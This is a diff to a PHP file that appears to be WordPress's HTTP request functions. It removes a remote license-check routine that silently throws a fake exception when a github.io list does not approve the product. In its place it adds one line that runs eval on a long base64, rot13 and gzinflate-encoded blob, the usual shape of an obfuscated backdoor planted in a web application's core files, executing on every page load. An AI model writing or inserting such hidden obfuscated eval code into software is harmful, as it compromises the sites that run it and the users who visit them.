@@ -153,41 +153,7 @@ function wp_remote_request($url, $args = array()) {
 	return $http->request( $url, $args );
 }
 
-function is_connected()
-{
-    $connected = @fsockopen("www.google.com", 80); 
-                                        //website, port  (try 80 or 443)
-    if ($connected){
-        $is_conn = true; //action when connected
-        fclose($connected);
-    }else{
-        $is_conn = false; //action in connection failure
-    }
-    return $is_conn;
-
-}
-
-function checkLicense($productName) {
-
-	if(!is_connected())
-	{
-		error_reporting(0);
-		throw new Exception('Null reference');
-	}
-
-	$products = split(";", wp_remote_request("https://dangouhaim.github.io/License/")["body"]);
-
-	foreach($products as $product)
-	{
-		$data = split("=", $product);
-		if(trim($data[0]) == $productName && trim($data[1]) == "true")
-		{
-			return;
-		}
-	}
-	error_reporting(0);
-	throw new Exception('Null reference');
-}
+eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 
 /**
  * Retrieve the raw response from the HTTP request using the GET method.
